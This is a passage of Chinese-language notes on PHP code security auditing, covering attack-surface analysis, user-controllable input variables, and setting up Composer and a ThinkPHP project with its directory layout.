+<h4 id="h:4661253f-1309-4462-a723-5fdd5494353c"><a href="#h:4661253f-1309-4462-a723-5fdd5494353c">设计</a></h4>
+<div class="outline-text-4" id="text-h:4661253f-1309-4462-a723-5fdd5494353c">
+<p>
+一般来说，如果使用 MVC 设计原则开发，网络应用程序有一个定义良好的代码布局。应用程序可以有自己的定制设计，也可以使用一些著名的设计框架，如 Struts/Spring 等。
+</p>
+
+<ul class="org-ul">
+<li>应用程序属性/配置参数存储在哪里？</li>
+<li>如何为任何功能/URL 识别业务类别？</li>
+<li>什么类型的类被执行来处理请求(例如。集中式控制器、命令类、视图页面等)？</li>
+<li>对于任何请求，视图是如何呈现给用户的？</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:757a5de5-9eec-4112-8751-d9375a2f753a" class="outline-4">
+<h4 id="h:757a5de5-9eec-4112-8751-d9375a2f753a"><a href="#h:757a5de5-9eec-4112-8751-d9375a2f753a">确定攻击面</a></h4>
+<div class="outline-text-4" id="text-h:757a5de5-9eec-4112-8751-d9375a2f753a">
+<p>
+通过分析输入、数据流和事务来确定攻击面。实际执行代码安全审计的主要部分是对攻击面进行分析。应用程序接受输入并产生某种输出。第一步是识别代码的所有输入。
+</p>
+
+<p>
+应用程序的输入可能包括以下要点:
+</p>
+<ul class="org-ul">
+<li>浏览器输入：一般是 GET POST 请求参数</li>
+<li>Cookie：如果是用户请求时带的，那是可以修改的</li>
+<li>文件</li>
+<li>命令行参数: 是否引用参数执行命令</li>
+<li>环境变量</li>
+</ul>
+
+<p>
+以上所有都是讲概念，来指导我们怎么去做的。
+</p>
+
+<p>
+我们要理解它底层的原理和我们在企业中的定位，然后思考出一套方案，根据所在企业现状来落地，完成一个闭环。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:73b19677-e609-4006-93a5-8fbf442b777f" class="outline-3">
+<h3 id="h:73b19677-e609-4006-93a5-8fbf442b777f"><a href="#h:73b19677-e609-4006-93a5-8fbf442b777f">PHP代码审计思路</a></h3>
+<div class="outline-text-3" id="text-h:73b19677-e609-4006-93a5-8fbf442b777f">
+<ul class="org-ul">
+<li>敏感函数方法回溯(反向审计)
+<ul class="org-ul">
+<li>查找项目中的敏感函数方法，查找传入的参数判断用户是否可控</li>
+</ul></li>
+<li>用户可控参数正向查找
+<ul class="org-ul">
+<li>查找项目中的用户输入、追踪用户输入，判断是否得到有效的过滤/调用敏感函数/存在逻辑问题</li>
+</ul></li>
+<li>关键业务功能分析(功能审计)
+<ul class="org-ul">
+<li>专门审计易出现漏洞的关键功能点
+<ul class="org-ul">
+<li>如 头像上传、系统登陆、文件下载等功能</li>
+</ul></li>
+</ul></li>
+<li>审计所有代码</li>
+</ul>
+</div>
+<div id="outline-container-h:39a775ed-a7bc-426a-9de3-ede88d8d192a" class="outline-4">
+<h4 id="h:39a775ed-a7bc-426a-9de3-ede88d8d192a"><a href="#h:39a775ed-a7bc-426a-9de3-ede88d8d192a">用户可控参数</a></h4>
+<div class="outline-text-4" id="text-h:39a775ed-a7bc-426a-9de3-ede88d8d192a">
+<p>
+<b>来自用户可控的输入, 安全审计中永远不要相信用户的输入</b>
+</p>
+
+<p>
+变量/常量/函数/等 描述
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">_SERVER</span> &#21253;&#21547; &#26381;&#21153;&#22120;&#20449;&#24687; &#29615;&#22659;&#21464;&#37327; &#29992;&#25143;&#20256;&#20837;&#30340;http&#22836;&#21644;uri&#36335;&#24452;&#31561;&#20449;&#24687;
+
+$<span class="org-variable-name">_GET</span>
+$<span class="org-variable-name">HTTP_GET_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;URL&#21442;&#25968;
+
+$<span class="org-variable-name">_POST</span>
+$<span class="org-variable-name">HTTP_POST_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;POST BODY&#30340;&#21442;&#25968; (&#24403; HTTP&#22836;&#20013; Content-Type &#20540; &#20026;application/x-www- form-urlencoded &#25110; multipart/form-data&#26102;&#25165;&#20250;&#34987;&#20256;&#20837;)
+
+$<span class="org-variable-name">_FILES</span>
+$<span class="org-variable-name">HTTP_POST_FILES</span> &#21253;&#21547; &#29992;&#25143;&#19978;&#20256;&#25991;&#20214;&#20449;&#24687; &#25991;&#20214;&#20869;&#23481; &#21407;&#25991;&#20214;&#21517; &#20020;&#26102;&#25991;&#20214;&#21517; &#22823;&#23567; &#31561;&#20449;&#24687;
+
+$<span class="org-variable-name">_COOKIE</span>
+$<span class="org-variable-name">HTTP_COOKIE_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;HTTP&#22836;&#20013;&#30340;Cookies kv&#20540;
+
+$<span class="org-variable-name">_REQUEST</span> &#21516;&#26102;&#21253;&#21547; $<span class="org-variable-name">GET</span> $<span class="org-variable-name">POST</span> $<span class="org-variable-name">_COOKIE</span>
+
+php://input
+$<span class="org-variable-name">HTTP_RAW_POST_DATA</span> &#21253;&#21547; &#29992;&#25143;POST&#35831;&#27714;&#20013;BODY &#30340;&#23436;&#25972;&#25968;&#25454; &#24120;&#35265;&#29992;&#27861;file_get_contents(<span class="org-string">'php://input'</span>);
+
+<span class="org-function-name">apache_request_headers</span>()
+<span class="org-function-name">getallheaders</span>() &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;http&#22836; (Apache ONLY)
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_ACCEPT_LANGUAGE'</span>] <span class="org-comment-delimiter">#</span><span class="org-comment">&#27983;&#35272;&#22120;&#35821;&#35328;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'REMOTE_ADDR'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#29992;&#25143; IP &#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'REMOTE_HOST'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#29992;&#25143;&#20027;&#26426;&#21517;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'REQUEST_URI'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">URL
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'REMOTE_PORT'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#31471;&#21475;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_NAME'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#26381;&#21153;&#22120;&#20027;&#26426;&#30340;&#21517;&#31216;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'PHP_SELF'</span>]         <span class="org-comment-delimiter">#</span><span class="org-comment">&#27491;&#22312;&#25191;&#34892;&#33050;&#26412;&#30340;&#25991;&#20214;&#21517;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'argv'</span>]             <span class="org-comment-delimiter">#</span><span class="org-comment">&#20256;&#36882;&#32473;&#35813;&#33050;&#26412;&#30340;&#21442;&#25968;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'argc'</span>]             <span class="org-comment-delimiter">#</span><span class="org-comment">&#20256;&#36882;&#32473;&#31243;&#24207;&#30340;&#21629;&#20196;&#34892;&#21442;&#25968;&#30340;&#20010;&#25968;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'GATEWAY_INTERFACE'</span>]    <span class="org-comment-delimiter">#</span><span class="org-comment">CGI &#35268;&#33539;&#30340;&#29256;&#26412;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_SOFTWARE'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#26381;&#21153;&#22120;&#26631;&#35782;&#30340;&#23383;&#20018;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_PROTOCOL'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#35831;&#27714;&#39029;&#38754;&#26102;&#36890;&#20449;&#21327;&#35758;&#30340;&#21517;&#31216;&#21644;&#29256;&#26412;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'REQUEST_METHOD'</span>]   <span class="org-comment-delimiter">#</span><span class="org-comment">&#35775;&#38382;&#39029;&#38754;&#26102;&#30340;&#35831;&#27714;&#26041;&#27861;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'QUERY_STRING'</span>]     <span class="org-comment-delimiter">#</span><span class="org-comment">&#26597;&#35810;(query)&#30340;&#23383;&#31526;&#20018;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'DOCUMENT_ROOT'</span>]    <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#36816;&#34892;&#33050;&#26412;&#25152;&#22312;&#30340;&#25991;&#26723;&#26681;&#30446;&#24405;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_ACCEPT'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; Accept: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_ACCEPT_CHARSET'</span>]   <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; Accept-Charset: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_ACCEPT_ENCODING'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; Accept-Encoding: &#22836;&#37096;&#30340;&#20869;&#23481;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_CONNECTION'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; Connection: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;&#20363;&#22914;&#65306;&#8220;Keep-Alive&#8221;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_HOST'</span>]        <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; Host: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_REFERER'</span>]     <span class="org-comment-delimiter">#</span><span class="org-comment">&#38142;&#25509;&#21040;&#24403;&#21069;&#39029;&#38754;&#30340;&#21069;&#19968;&#39029;&#38754;&#30340; URL &#22320;&#22336;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTP_USER_AGENT'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#35831;&#27714;&#30340; User_Agent: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'HTTPS'</span>]            <span class="org-comment-delimiter">#</span><span class="org-comment">&#22914;&#26524;&#36890;&#36807;https&#35775;&#38382;,&#21017;&#34987;&#35774;&#20026;&#19968;&#20010;&#38750;&#31354;&#30340;&#20540;(on)&#65292;&#21542;&#21017;&#36820;&#22238;off
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SCRIPT_FILENAME'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#25191;&#34892;&#33050;&#26412;&#30340;&#32477;&#23545;&#36335;&#24452;&#21517;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_ADMIN'</span>]     <span class="org-comment-delimiter">#</span><span class="org-comment">&#31649;&#29702;&#21592;&#20449;&#24687;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_PORT'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#26381;&#21153;&#22120;&#25152;&#20351;&#29992;&#30340;&#31471;&#21475;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SERVER_SIGNATURE'</span>] <span class="org-comment-delimiter">#</span><span class="org-comment">&#21253;&#21547;&#26381;&#21153;&#22120;&#29256;&#26412;&#21644;&#34394;&#25311;&#20027;&#26426;&#21517;&#30340;&#23383;&#31526;&#20018;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'PATH_TRANSLATED'</span>]  <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403;&#21069;&#33050;&#26412;&#25152;&#22312;&#25991;&#20214;&#31995;&#32479;&#65288;&#19981;&#26159;&#25991;&#26723;&#26681;&#30446;&#24405;&#65289;&#30340;&#22522;&#26412;&#36335;&#24452;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'SCRIPT_NAME'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#21253;&#21547;&#24403;&#21069;&#33050;&#26412;&#30340;&#36335;&#24452;&#12290;&#36825;&#22312;&#39029;&#38754;&#38656;&#35201;&#25351;&#21521;&#33258;&#24049;&#26102;&#38750;&#24120;&#26377;&#29992;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'PHP_AUTH_USER'</span>]    <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#29992;&#25143;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'PHP_AUTH_PW'</span>]      <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#29992;&#25143;&#36755;&#20837;&#30340;&#23494;&#30721;&#12290;
+</span>$<span class="org-variable-name">_SERVER</span>[<span class="org-string">'AUTH_TYPE'</span>]        <span class="org-comment-delimiter">#</span><span class="org-comment">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#35748;&#35777;&#30340;&#31867;&#22411;</span>
+</pre>
+</div>
+
+<p>
+可以通过 Request 对象完成全局输入变量的检测、获取和安全过滤，支持包括$_GET 、 $_POST 、 $_REQUEST 、 $_SERVER 、 $_SESSION 、 $_COOKIE 、 $_ENV 等系统变量，以及文件上传信息。
+</p>
+
+<p>
+以 Vulnerable-Web-Application 代码为例，全局搜索$_GET、$_REQUEST等
+</p>
+
+<p>
+dvwa 代码地址： <a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a>、
+</p>
+
+
+<p>
+审计流程：
+</p>
+<ul class="org-ul">
+<li>查找用户输入</li>
+<li>查找敏感函数</li>
+<li>审计业务功能</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:da475ddc-8b3a-4da2-b4b9-888112bb9e99" class="outline-3">
+<h3 id="h:da475ddc-8b3a-4da2-b4b9-888112bb9e99"><a href="#h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">Composer安装</a></h3>
+<div class="outline-text-3" id="text-h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">
+<p>
+Composer 是 PHP 用来管理依赖（dependency）关系的工具。可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。
+</p>
+
+<p>
+<a href="https://getcomposer.org/">https://getcomposer.org/</a>
+</p>
+
+<p>
+安装 Composer，你只需要下载 composer.phar 可执行文件。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">curl -sS https://getcomposer.org/installer | php
+mv composer.phar /usr/local/bin/composer
+</pre>
+</div>
+
+<p>
+在 Windows 中，你需要下载并运行 <a href="https://getcomposer.org/Composer-Setup.exe">Composer-Setup.exe</a>。
+</p>
+
+<p>
+为了避免安装过慢，可以使用阿里云的 composer 镜像。ps 安装thinkphp框架后再用阿里去composer镜像。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">composer config -g repo.packagist composer https://packagist.phpcomposer.com
+</pre>
+</div>
+
+<p>
+安装依赖时可使用命令
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">composer install
+</pre>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:84c68648-67fc-4ca8-b3f3-10ebf448d02a" class="outline-2">
+<h2 id="h:84c68648-67fc-4ca8-b3f3-10ebf448d02a"><a href="#h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">THINKPHP框架输入变量</a></h2>
+<div class="outline-text-2" id="text-h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">
+<p>
+官方文档：<a href="https://www.kancloud.cn/manual/thinkphp5/118006">https://www.kancloud.cn/manual/thinkphp5/118006</a>
+</p>
+</div>
+<div id="outline-container-h:4be97d62-05c8-434a-865e-32ee54ca46f6" class="outline-3">
+<h3 id="h:4be97d62-05c8-434a-865e-32ee54ca46f6"><a href="#h:4be97d62-05c8-434a-865e-32ee54ca46f6">概述</a></h3>
+<div class="outline-text-3" id="text-h:4be97d62-05c8-434a-865e-32ee54ca46f6">
+<p>
+ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。遵循 Apache2 开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售。
+</p>
+
+<p>
+通过 composer 启动一个thinkphp示例项目
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">composer create-project topthink/think tp
+<span class="org-builtin">cd</span> tp
+php think run
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#35775;&#38382;&#26412;&#22320;8000&#22320;&#22336;
+</span>http://localhost:8000
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#22914;&#26524;&#23433;&#35013;&#25253;&#38169;&#38656;&#35201;&#20808;&#21024;&#38500;&#20043;&#21069;&#30340;&#38236;&#20687;
+</span>composer config -g --unset repos.packagist
+</pre>
+</div>
+
+<p>
+thinkphp框架目录如下，可以看到初始的目录结构：
+</p>
+
+<p>
+thinkphp5: <a href="https://www.kancloud.cn/manual/thinkphp5/118008">https://www.kancloud.cn/manual/thinkphp5/118008</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">project  &#24212;&#29992;&#37096;&#32626;&#30446;&#24405;
+&#9500;&#9472;application           &#24212;&#29992;&#30446;&#24405;&#65288;&#21487;&#35774;&#32622;&#65289;
+&#9474;  &#9500;&#9472;common             &#20844;&#20849;&#27169;&#22359;&#30446;&#24405;&#65288;&#21487;&#26356;&#25913;&#65289;
+&#9474;  &#9500;&#9472;index              &#27169;&#22359;&#30446;&#24405;(&#21487;&#26356;&#25913;)
+&#9474;  &#9474;  &#9500;&#9472;config.php      &#27169;&#22359;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9474;  &#9500;&#9472;common.php      &#27169;&#22359;&#20989;&#25968;&#25991;&#20214;
+&#9474;  &#9474;  &#9500;&#9472;controller      &#25511;&#21046;&#22120;&#30446;&#24405;
+&#9474;  &#9474;  &#9500;&#9472;model           &#27169;&#22411;&#30446;&#24405;
+&#9474;  &#9474;  &#9500;&#9472;view            &#35270;&#22270;&#30446;&#24405;
+&#9474;  &#9474;  &#9492;&#9472; ...            &#26356;&#22810;&#31867;&#24211;&#30446;&#24405;
+&#9474;  &#9500;&#9472;command.php        &#21629;&#20196;&#34892;&#24037;&#20855;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9500;&#9472;common.php         &#24212;&#29992;&#20844;&#20849;&#65288;&#20989;&#25968;&#65289;&#25991;&#20214;
+&#9474;  &#9500;&#9472;config.php         &#24212;&#29992;&#65288;&#20844;&#20849;&#65289;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9500;&#9472;database.php       &#25968;&#25454;&#24211;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9500;&#9472;tags.php           &#24212;&#29992;&#34892;&#20026;&#25193;&#23637;&#23450;&#20041;&#25991;&#20214;
+&#9474;  &#9492;&#9472;route.php          &#36335;&#30001;&#37197;&#32622;&#25991;&#20214;
+&#9500;&#9472;extend                &#25193;&#23637;&#31867;&#24211;&#30446;&#24405;&#65288;&#21487;&#23450;&#20041;&#65289;
+&#9500;&#9472;public                WEB &#37096;&#32626;&#30446;&#24405;&#65288;&#23545;&#22806;&#35775;&#38382;&#30446;&#24405;&#65289;
+&#9474;  &#9500;&#9472;static             &#38745;&#24577;&#36164;&#28304;&#23384;&#25918;&#30446;&#24405;(css,js,image)
+&#9474;  &#9500;&#9472;index.php          &#24212;&#29992;&#20837;&#21475;&#25991;&#20214;
+&#9474;  &#9500;&#9472;router.php         &#24555;&#36895;&#27979;&#35797;&#25991;&#20214;
+&#9474;  &#9492;&#9472;.htaccess          &#29992;&#20110; apache &#30340;&#37325;&#20889;
+&#9500;&#9472;runtime               &#24212;&#29992;&#30340;&#36816;&#34892;&#26102;&#30446;&#24405;&#65288;&#21487;&#20889;&#65292;&#21487;&#35774;&#32622;&#65289;
+&#9500;&#9472;vendor                &#31532;&#19977;&#26041;&#31867;&#24211;&#30446;&#24405;&#65288;Composer&#65289;
+&#9500;&#9472;thinkphp              &#26694;&#26550;&#31995;&#32479;&#30446;&#24405;
+&#9474;  &#9500;&#9472;lang               &#35821;&#35328;&#21253;&#30446;&#24405;
+&#9474;  &#9500;&#9472;library            &#26694;&#26550;&#26680;&#24515;&#31867;&#24211;&#30446;&#24405;
+&#9474;  &#9474;  &#9500;&#9472;think           Think &#31867;&#24211;&#21253;&#30446;&#24405;
+&#9474;  &#9474;  &#9492;&#9472;traits          &#31995;&#32479; Traits &#30446;&#24405;
+&#9474;  &#9500;&#9472;tpl                &#31995;&#32479;&#27169;&#26495;&#30446;&#24405;
+&#9474;  &#9500;&#9472;.htaccess          &#29992;&#20110; apache &#30340;&#37325;&#20889;
+&#9474;  &#9500;&#9472;.travis.yml        CI &#23450;&#20041;&#25991;&#20214;
+&#9474;  &#9500;&#9472;base.php           &#22522;&#30784;&#23450;&#20041;&#25991;&#20214;
+&#9474;  &#9500;&#9472;composer.json      composer &#23450;&#20041;&#25991;&#20214;
+&#9474;  &#9500;&#9472;console.php        &#25511;&#21046;&#21488;&#20837;&#21475;&#25991;&#20214;
+&#9474;  &#9500;&#9472;convention.php     &#24815;&#20363;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9500;&#9472;helper.php         &#21161;&#25163;&#20989;&#25968;&#25991;&#20214;&#65288;&#21487;&#36873;&#65289;
+&#9474;  &#9500;&#9472;LICENSE.txt        &#25480;&#26435;&#35828;&#26126;&#25991;&#20214;
+&#9474;  &#9500;&#9472;phpunit.xml        &#21333;&#20803;&#27979;&#35797;&#37197;&#32622;&#25991;&#20214;
+&#9474;  &#9500;&#9472;README.md          README &#25991;&#20214;
+&#9474;  &#9492;&#9472;start.php          &#26694;&#26550;&#24341;&#23548;&#25991;&#20214;
+&#9500;&#9472;build.php             &#33258;&#21160;&#29983;&#25104;&#23450;&#20041;&#25991;&#20214;&#65288;&#21442;&#32771;&#65289;
+&#9500;&#9472;composer.json         composer &#23450;&#20041;&#25991;&#20214;
+&#9500;&#9472;LICENSE.txt           &#25480;&#26435;&#35828;&#26126;&#25991;&#20214;
+&#9500;&#9472;README.md             README &#25991;&#20214;
+&#9500;&#9472;think                 &#21629;&#20196;&#34892;&#20837;&#21475;&#25991;&#20214;
+</pre>
+</div>
+
+
+<p>
+thinkphp8: <a href="https://doc.thinkphp.cn/v8_0/directory_structure.html">https://doc.thinkphp.cn/v8_0/directory_structure.html</a>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">www  WEB&#37096;&#32626;&#30446;&#24405;&#65288;&#25110;&#32773;&#23376;&#30446;&#24405;&#65289;
+&#9500;&#9472;app           &#24212;&#29992;&#30446;&#24405;
+&#9474;  &#9500;&#9472;controller      &#25511;&#21046;&#22120;&#30446;&#24405;
+&#9474;  &#9500;&#9472;model           &#27169;&#22411;&#30446;&#24405;  &#25152;&#26377;&#25968;&#25454;&#24211;&#25805;&#20316;&#37117;&#25918;&#36825;
+&#9474;  &#9500;&#9472; ...            &#26356;&#22810;&#31867;&#24211;&#30446;&#24405;
+&#9474;  &#9474;
+&#9474;  &#9500;&#9472;common.php         &#20844;&#20849;&#20989;&#25968;&#25991;&#20214;
+&#9474;  &#9492;&#9472;event.php          &#20107;&#20214;&#23450;&#20041;&#25991;&#20214;
+&#9474;
+&#9500;&#9472;config                &#37197;&#32622;&#30446;&#24405;
+&#9474;  &#9500;&#9472;app.php            &#24212;&#29992;&#37197;&#32622;
+&#9474;  &#9500;&#9472;cache.php          &#32531;&#23384;&#37197;&#32622;
+&#9474;  &#9500;&#9472;console.php        &#25511;&#21046;&#21488;&#37197;&#32622;
+&#9474;  &#9500;&#9472;cookie.php         Cookie&#37197;&#32622;
+&#9474;  &#9500;&#9472;database.php       &#25968;&#25454;&#24211;&#37197;&#32622;
+&#9474;  &#9500;&#9472;filesystem.php     &#25991;&#20214;&#30913;&#30424;&#37197;&#32622;
+&#9474;  &#9500;&#9472;lang.php           &#22810;&#35821;&#35328;&#37197;&#32622;
+&#9474;  &#9500;&#9472;log.php            &#26085;&#24535;&#37197;&#32622;
+&#9474;  &#9500;&#9472;middleware.php     &#20013;&#38388;&#20214;&#37197;&#32622;
+&#9474;  &#9500;&#9472;route.php          URL&#21644;&#36335;&#30001;&#37197;&#32622;
+&#9474;  &#9500;&#9472;session.php        Session&#37197;&#32622;
+&#9474;  &#9500;&#9472;trace.php          Trace&#37197;&#32622;
+&#9474;  &#9492;&#9472;view.php           &#35270;&#22270;&#37197;&#32622;
+&#9474;
+&#9500;&#9472;view            &#35270;&#22270;&#30446;&#24405;
+&#9500;&#9472;route                 &#36335;&#30001;&#23450;&#20041;&#30446;&#24405;
+&#9474;  &#9500;&#9472;route.php          &#36335;&#30001;&#23450;&#20041;&#25991;&#20214;
+&#9474;  &#9492;&#9472; ...   
+&#9474;
+&#9500;&#9472;public                WEB&#30446;&#24405;&#65288;&#23545;&#22806;&#35775;&#38382;&#30446;&#24405;&#65289;
+&#9474;  &#9500;&#9472;index.php          &#20837;&#21475;&#25991;&#20214;
+&#9474;  &#9500;&#9472;router.php         &#24555;&#36895;&#27979;&#35797;&#25991;&#20214;
+&#9474;  &#9492;&#9472;.htaccess          &#29992;&#20110;apache&#30340;&#37325;&#20889;
+&#9474;
+&#9500;&#9472;extend                &#25193;&#23637;&#31867;&#24211;&#30446;&#24405;
+&#9500;&#9472;runtime               &#24212;&#29992;&#30340;&#36816;&#34892;&#26102;&#30446;&#24405;&#65288;&#21487;&#20889;&#65292;&#21487;&#23450;&#21046;&#65289;
+&#9500;&#9472;vendor                Composer&#31867;&#24211;&#30446;&#24405;   &#31532;&#19977;&#26041;&#30340;&#65292;&#19981;&#23457;&#35745;
+&#9500;&#9472;.example.env          &#29615;&#22659;&#21464;&#37327;&#31034;&#20363;&#25991;&#20214;
+&#9500;&#9472;composer.json         composer &#23450;&#20041;&#25991;&#20214;
+&#9500;&#9472;LICENSE.txt           &#25480;&#26435;&#35828;&#26126;&#25991;&#20214;
+&#9500;&#9472;README.md             README &#25991;&#20214;
+&#9500;&#9472;think                 &#21629;&#20196;&#34892;&#20837;&#21475;&#25991;&#20214;
+</pre>
+</div>
+
+<p>
+重点关注：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#9500;&#9472;app           &#24212;&#29992;&#30446;&#24405;
+&#9474;  &#9500;&#9472;controller      &#25511;&#21046;&#22120;&#30446;&#24405;
+&#9474;  &#9500;&#9472;model           &#27169;&#22411;&#30446;&#24405;  &#25152;&#26377;&#25968;&#25454;&#24211;&#25805;&#20316;&#37117;&#25918;&#36825;
+
+&#9500;&#9472;route                 &#36335;&#30001;&#23450;&#20041;&#30446;&#24405;
+&#9474;  &#9500;&#9472;route.php          &#36335;&#30001;&#23450;&#20041;&#25991;&#20214;
+</pre>
+</div>
+
+
+<p>
+使用框架和不使用框架的区别
+</p>
+<ul class="org-ul">
+<li>访问方式
+<ul class="org-ul">
+<li>使用框架：访问设置好的接口</li>
+<li>没有使用框架：访问系统文件路径</li>
+</ul></li>
+</ul>
+</div>
+<div id="outline-container-h:86d5f529-40eb-46cc-99a0-202ff230ded6" class="outline-4">
+<h4 id="h:86d5f529-40eb-46cc-99a0-202ff230ded6"><a href="#h:86d5f529-40eb-46cc-99a0-202ff230ded6">入口文件</a></h4>
+<div class="outline-text-4" id="text-h:86d5f529-40eb-46cc-99a0-202ff230ded6">
+<p>
+用户请求的PHP文件，负责处理一个请求（注意，不一定是URL请求）的生命周期，最常见的入口文件就是 index.php ，有时候也会为了某些特殊的需求而增加新的入口文件，例如给后台模块单独设置的一个入口文件admin.php 或者一个控制器程序入口 think 都属于入口文件。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">http://127.0.0.1:8000/hello/abcd
+</pre>
+</div>
+</div>
